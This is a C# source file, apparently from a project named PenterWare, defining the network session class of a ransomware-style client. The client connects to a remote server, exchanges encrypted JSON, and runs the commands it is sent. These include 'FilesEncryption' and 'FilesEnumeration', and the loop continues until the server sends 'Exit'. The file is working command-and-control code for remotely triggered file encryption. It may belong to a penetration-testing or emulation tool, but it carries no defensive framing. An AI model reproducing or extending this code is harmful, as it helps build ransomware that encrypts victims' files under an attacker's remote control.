using System;
using System.Collections.Generic;
using Newtonsoft.Json;
using PenterWare.Actions;
using PenterWare.Actions.Results;
using PenterWare.Network.Clients;
using PenterWare.Utils;

namespace PenterWare.Network;

internal class Session
{
	public Client Client { get; set; }

	public Session(Client client)
	{
		Client = client;
	}

	public void StartSession(object toSend)
	{
		Client.InitConnection();
		RunRegistry.Session = this;
		string jsonString = SendReceive(toSend, sendEncrypted: false, receiveEncrypted: true);
		IAction<ActionResult> action = ParseResponseGetNextAction(jsonString);
		if (action != null)
		{
			toSend = action.RunAction();
		}
		while (toSend != null)
		{
			jsonString = SendReceive(toSend, sendEncrypted: true, receiveEncrypted: true);
			toSend = ParseResponseGetNextAction(jsonString)?.RunAction();
		}
		GeneralUtils.Log("Got nothing to run");
		SendDone();
	}

	public string SendReceive(object toSend, bool sendEncrypted = false, bool receiveEncrypted = false)
	{
		string text = JsonConvert.SerializeObject(toSend);
		if (sendEncrypted)
		{
			text = Convert.ToBase64String(RunRegistry.Cipher.Encrypt(text));
		}
		GeneralUtils.Log("sending " + text + " and waiting for response");
		Client.Send(text);
		string text2 = Client.Recieve(300000000);
		if (receiveEncrypted)
		{
			text2 = RunRegistry.Cipher.Decrypt(Convert.FromBase64String(text2));
		}
		return text2;
	}

	public void SendAsync(object toSend)
	{
		string data = JsonConvert.SerializeObject(toSend);
		Client.Send(data);
	}

	public bool SendReceiveAck(object toSend)
	{
		return SendReceive(toSend, sendEncrypted: true, receiveEncrypted: true) != string.Empty;
	}

	public void SendDummyData()
	{
		Dictionary<string, string> toSend = new Dictionary<string, string> { { "ActionName", "Continue" } };
		SendReceiveAck(toSend);
	}

	public void SendDone()
	{
		Dictionary<string, string> toSend = new Dictionary<string, string> { { "ActionName", "Done" } };
		SendReceiveAck(toSend);
	}

	public IAction<ActionResult> ParseResponseGetNextAction(string jsonString)
	{
		IAction<ActionResult> result = null;
		JsonSerializerSettings settings = new JsonSerializerSettings
		{
			NullValueHandling = NullValueHandling.Ignore,
			MissingMemberHandling = MissingMemberHandling.Ignore
		};
		CommandResponse commandResponse = JsonConvert.DeserializeObject<CommandResponse>(jsonString, settings);
		if (commandResponse != null)
		{
			switch (commandResponse.Command)
			{
			default:
				GeneralUtils.Log("Problem in " + jsonString + ":");
				GeneralUtils.Log(commandResponse.Command + " has no mapping. no action will be preformed");
				break;
			case "Exit":
				GeneralUtils.Log("Exiting");
				EndSession();
				break;
			case "FilesEncryption":
				result = new FilesEncryptionAction();
				break;
			case "FilesEnumeration":
				result = new FilesEnumerationAction();
				break;
			}
		}
		return result;
	}

	public void EndSession()
	{
		ActionResult actionResult = new ActionResult();
		actionResult.ActionName = "Exit";
		SendAsync(actionResult);
		Client.Close();
	}
}
